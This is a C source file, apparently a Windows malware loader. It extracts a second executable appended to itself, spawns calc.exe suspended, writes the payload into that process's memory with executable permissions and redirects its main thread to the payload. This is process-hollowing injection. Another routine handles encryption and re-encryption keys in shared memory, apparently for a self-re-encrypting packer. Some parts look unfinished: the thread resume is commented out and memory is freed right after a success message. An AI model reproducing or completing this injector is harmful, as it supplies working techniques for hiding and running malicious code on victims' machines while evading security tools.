#include "loader.h"

ULONGLONG getFirstPEFileSize(const char* peFilePath) {
    // Open the PE file
    FILE* file = fopen(peFilePath, "rb");
    if (!file) {
        fprintf(stderr, "Failed to open file\n");
        return 0;
    }

    // Read the DOS Header
    IMAGE_DOS_HEADER dosHeader;
    if (fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file) != 1) {
        fprintf(stderr, "Failed to read DOS header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'MZ' signature
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid DOS header)\n");
        fclose(file);
        return 0;
    }

    // Move to the NT Header
    if (fseek(file, dosHeader.e_lfanew, SEEK_SET) != 0) {
        fprintf(stderr, "Failed to seek to NT header\n");
        fclose(file);
        return 0;
    }

    // Read the NT Header
    IMAGE_NT_HEADERS ntHeaders;
    if (fread(&ntHeaders, sizeof(IMAGE_NT_HEADERS), 1, file) != 1) {
        fprintf(stderr, "Failed to read NT header\n");
        fclose(file);
        return 0;
    }

    // Check for the 'PE\0\0' signature
    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "Invalid PE file (not a valid NT header)\n");
        fclose(file);
        return 0;
    }

    // Calculate the PE file size
    ULONGLONG fileSize = ntHeaders.OptionalHeader.SizeOfHeaders;
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER sectionHeader;
        if (fread(&sectionHeader, sizeof(IMAGE_SECTION_HEADER), 1, file) != 1) {
            fprintf(stderr, "Failed to read section header\n");
            fclose(file);
            return 0;
        }

        fileSize += sectionHeader.SizeOfRawData;
    }

    fclose(file);

    printf("First PE File Size: %llu bytes\n", fileSize);
    return fileSize;
}


ULONGLONG getPEBasePhysicalAddress(const char* firstPEFilePath) {
    // Get the size of the first PE file
    ULONGLONG firstPEFileSize = getFirstPEFileSize(firstPEFilePath);
    if (firstPEFileSize == 0) {
        fprintf(stderr, "Failed to get PE file size\n");
        return 0;
    }

    // The base address of the second PE will be right after the first PE
    ULONGLONG secondPEBaseAddress = firstPEFileSize;

    printf("Base physical Address of second PE: 0x%08llX\n", secondPEBaseAddress);

    return secondPEBaseAddress;
}

// i might try using the commandline b64 encoded first, just to for testing purposes
void passProcessInfo() {
    UINT_PTR baseAddress = (UINT_PTR)GetModuleHandle(NULL);
    if (baseAddress == 0) {
        printf("Error: Unable to get module handle.\n");
        return; // Exit with an error
    }
    printf("Base Address: 0x%llX\n", baseAddress);

    // Shared Memory Structure
    ProcessData *data = NULL;
    HANDLE hMapFile;

    // Create or open shared memory
    hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ProcessData), SHARED_MEMORY_NAME);
    if (hMapFile == NULL) {
        fprintf(stderr, "Could not create file mapping object (%ld).\n", GetLastError());
        return;
    }

    // Map the shared memory into the process's address space
    data = (ProcessData*)MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ProcessData));
    if (data == NULL) {
        fprintf(stderr, "Could not map view of file (%ld).\n", GetLastError());
        CloseHandle(hMapFile);
        return;
    }

    // Analyze the executable to retrieve the function information
    FunctionInfo* functions = NULL;
    size_t numFunctions = 0;

    functions = analyzeExecutable(&numFunctions);
    if (functions == NULL || numFunctions == 0) {
        fprintf(stderr, "No functions found or failed to analyze executable.\n");
        return;
    }
    data->functions = functions;
    data->numFunctions = numFunctions;

    // Generate next decryption key
    srand(time(NULL));
    unsigned char nextEncryptionKey = (unsigned char)(rand() % 256);
    data->nextEncryptionKey = nextEncryptionKey;

    // Encryption key (should match the key used during encryption)
    unsigned char encryptionKey = 0x00;
    encryptionKey = *((unsigned char*)(baseAddress + getMetaSectionAddress(baseAddress) + getMetaSectionVirtualSize(baseAddress) - sizeof(encryptionKey)));

    if (encryptionKey == 0x00) {
        printf("Encryption Key not found.\n");
        exit(0);
    }

    unsigned char recryptionKey = nextEncryptionKey ^ encryptionKey;
    data->recryptionKey = recryptionKey;

    // Get the current executable path
    char executablePath[512];
    if (GetModuleFileName(NULL, executablePath, sizeof(executablePath)) == 0) {
        fprintf(stderr, "Error getting executable path: %ld\n", GetLastError());
        return;
    }

    data->executablePath = executablePath;
    printf("Current executable path: %s\n", executablePath);

    // Map base address for key storage
    UINT_PTR keyAddress = Rva2Offset((UINT_PTR)getMetaSectionAddress(baseAddress), baseAddress);
    data->keyAddress = keyAddress;

    // Close the shared memory
    UnmapViewOfFile(data);
    CloseHandle(hMapFile);
}

HANDLE createProcess(PPROCESS_INFORMATION pi) {
    STARTUPINFOA si = {0};
    
    si.cb = sizeof(STARTUPINFOA);
    
    // Path to the executable (e.g., calculator)
    LPCSTR applicationName = "C:\\Windows\\System32\\calc.exe";
    LPCSTR commandLine = NULL;  // Optional, pass if you need arguments

    // Create the process
    BOOL success = CreateProcessA(
        applicationName,           // Path to the executable
        NULL,                      // Command line arguments (or NULL)
        NULL,                      // Process security attributes (default)
        NULL,                      // Thread security attributes (default)
        FALSE,                     // Don't inherit handles
        CREATE_SUSPENDED,          // DETACHED_PROCESS | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP |
        NULL,                      // Environment (default)
        NULL,                      // Current directory (default)
        &si,                       // Startup information (e.g., window size, etc.)
        pi                         // Process information (output)
    );

    if (!success) {
        printf("CreateProcessA failed with error code %lu\n", GetLastError());
        return NULL;
    }

    printf("Process created successfully\n");
    printf("Process ID: %lu\n", pi->dwProcessId);

    return pi->hProcess;
}

BOOL resumeProcess(HANDLE hThread) {
    DWORD result = ResumeThread(hThread);

    if (result == (DWORD)-1) {
        printf("Failed to resume thread (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

PIMAGE_NT_HEADERS getNTHeaders(LPVOID lpBaseAddress) {
    return (PIMAGE_NT_HEADERS)((BYTE*)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)->e_lfanew);
}

DWORD getImageBaseForSecondPE(const char* filename) {
    // Open the file for reading
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file %s (Error: %lu)\n", filename, GetLastError());
        return 0;
    }

    // Get the total size of the file
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        printf("Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 0;
    }

    // Allocate memory to read the file into
    LPVOID fileData = VirtualAlloc(NULL, fileSize.QuadPart, MEM_COMMIT, PAGE_READWRITE);
    if (fileData == NULL) {
        printf("Failed to allocate memory for the file (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 0;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileData, fileSize.QuadPart, &bytesRead, NULL)) {
        printf("Failed to read file (Error: %lu)\n", GetLastError());
        VirtualFree(fileData, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 0;
    }

    // Close the file handle
    CloseHandle(hFile);

    // Get the NT Headers from the mapped file data
    PIMAGE_NT_HEADERS ntHeaders = getNTHeaders(fileData + getPEBasePhysicalAddress(filename));
    if (!ntHeaders) {
        printf("Failed to retrieve NT Headers\n");
        VirtualFree(fileData, 0, MEM_RELEASE);
        return 0;
    }

    // Extract the ImageBase from the OptionalHeader section
    DWORD imageBase = ntHeaders->OptionalHeader.ImageBase;

    printf("Image Base for second PE: 0x%04lX\n", imageBase);

    // Clean up and return the ImageBase
    VirtualFree(fileData, 0, MEM_RELEASE);
    return imageBase;
}

LPVOID loadPEFile(const char *filename, PLARGE_INTEGER peSize) {
    // Open the file for reading
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file %s (Error: %lu)\n", filename, GetLastError());
        return NULL;
    }

    // Get the total size of the file
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        printf("Failed to get file size (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    printf("File size: %lld bytes\n", fileSize.QuadPart);

    // Get the physical base address (i.e., the offset for the second PE)
    ULONGLONG offset = getPEBasePhysicalAddress(filename);  // This function should return the offset based on the first PE

    // Ensure that the offset doesn't exceed the file size
    if (offset >= fileSize.QuadPart) {
        printf("The offset exceeds the file size (Offset: %llu, FileSize: %llu)\n", offset, fileSize.QuadPart);
        CloseHandle(hFile);
        return NULL;
    }

    printf("File Offset: 0x%llX\n", offset);

    // Calculate the size of the second PE by subtracting the offset from the file size
    peSize->QuadPart = fileSize.QuadPart - offset;

    // Allocate memory for the second PE
    LPVOID buffer = VirtualAlloc(NULL, peSize->QuadPart, MEM_COMMIT, PAGE_READWRITE);
    if (buffer == NULL) {
        printf("Failed to allocate memory (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    printf("Second PE File Size: %lld bytes\n", peSize->QuadPart);

    // Move the file pointer to the location of the second PE using the calculated offset
    LONG highOffset = (LONG)(offset >> 32);  // Cast directly to LONG for high part
    LONG lowOffset = (LONG)(offset & 0xFFFFFFFF);  // Cast directly to LONG for low part

    if (SetFilePointer(hFile, lowOffset, &highOffset, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        printf("Failed to seek to PE offset (Error: %lu)\n", GetLastError());
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    // Read the second PE into the allocated memory
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, peSize->QuadPart, &bytesRead, NULL)) {
        printf("Failed to read second PE file (Error: %lu)\n", GetLastError());
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    // Close the file handle
    CloseHandle(hFile);

    // Return the buffer containing the second PE
    return buffer;
}

BOOL unmapProcess(HANDLE hProcess, LPVOID allocatedMemory) {
    if (allocatedMemory != NULL) {
        if (VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE)) {
            return TRUE;
        } else {
            printf("Failed to unmap memory in target process (Error: %lu)\n", GetLastError());
        }
    }
    return FALSE;
}

// MUST HAVE FREE MEMORY AT OFFSET
LPVOID allocateMemoryInTarget(HANDLE hProcess, PLARGE_INTEGER peSize, LPVOID peBase) {
    LPVOID allocatedMemory = VirtualAllocEx(hProcess, peBase, peSize->QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("Failed to allocate memory in target process (Error: %lu)\n", GetLastError());
    }
    return allocatedMemory;
}

BOOL writePEToProcess(HANDLE hProcess, LPVOID targetMemory, LPVOID sourceMemory, PLARGE_INTEGER peSize) {
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, targetMemory, sourceMemory, peSize->QuadPart, &bytesWritten)) {
        printf("Failed to write to target process memory (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL setMemoryProtection(HANDLE hProcess, LPVOID pMemory, PLARGE_INTEGER peSize) {
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, pMemory, peSize->QuadPart, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL setThreadContextToEntryPoint(HANDLE hThread, LPVOID entryPoint) {
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &context)) {
        printf("Failed to get thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    // Set the EIP or RIP to the entry point of the PE
    context.Rip = (UINT_PTR)entryPoint; // x86, change to context.Rip for x64

    if (!SetThreadContext(hThread, &context)) {
        printf("Failed to set thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

void fixIAT(UINT_PTR baseAddress) {
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY* importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (importDir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(baseAddress + importDir->VirtualAddress);
        while (importDesc->Name) {
            char* moduleName = (char*)(baseAddress + importDesc->Name);
            HMODULE moduleHandle = LoadLibraryA(moduleName);
            if (moduleHandle) {
                IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)(baseAddress + importDesc->FirstThunk);
                while (thunk->u1.Function) {
                    IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(baseAddress + thunk->u1.AddressOfData);
                    FARPROC procAddress = GetProcAddress(moduleHandle, importByName->Name);
                    thunk->u1.Function = (UINT_PTR)procAddress;
                    thunk++;
                }
            }
            importDesc++;
        }
    }
}

BOOL injectAppendedPEIntoCalc() {
    // Get the current executable's path
    char currentExePath[MAX_PATH];
    if (GetModuleFileNameA(NULL, currentExePath, MAX_PATH) == 0) {
        printf("Failed to get current executable path (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    // Load the appended PE from the current executable
    LARGE_INTEGER peSize;
    LPVOID appendedPE = loadPEFile(currentExePath, &peSize);
    if (appendedPE == NULL) {
        printf("Failed to load appended PE from %s\n", currentExePath);
        return FALSE;
    }

    // Create the target process (calc.exe) in a suspended state
    PROCESS_INFORMATION pi = {0};
    HANDLE hProcess = createProcess(&pi);
    if (hProcess == NULL) {
        printf("Failed to create calc.exe process\n");
        return FALSE;
    }

    // Allocate memory in the target process
    DWORD peBase = getImageBaseForSecondPE(currentExePath);
    LPVOID allocatedMemory = allocateMemoryInTarget(hProcess, &peSize, (LPVOID)peBase);
    if (allocatedMemory == NULL) {
        printf("Failed to allocate memory in calc.exe\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the PE to the allocated memory in the target process
    if (!writePEToProcess(hProcess, allocatedMemory, appendedPE, &peSize)) {
        printf("Failed to write PE to calc.exe\n");
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Set memory protection for the allocated memory in calc.exe
    if (!setMemoryProtection(hProcess, allocatedMemory, &peSize)) {
        printf("Failed to set memory protection in calc.exe\n");
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get the main thread of the target process
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pi.dwThreadId);
    if (hThread == NULL) {
        printf("Failed to open main thread of calc.exe (Error: %lu)\n", GetLastError());
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Set the thread context to start executing from the entry point of the injected PE
    PIMAGE_NT_HEADERS ntHeaders = getNTHeaders(appendedPE);
    LPVOID entryPoint = (LPVOID)(ntHeaders->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)allocatedMemory);
    if (!setThreadContextToEntryPoint(hThread, entryPoint)) {
        printf("Failed to set thread context to entry point in calc.exe\n");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    /*
    // Resume the thread in the target process (calc.exe)
    if (!resumeProcess(hThread)) {
        printf("Failed to resume thread in calc.exe\n");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    */

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("Appended PE successfully injected and executed in calc.exe\n");
    return TRUE;
}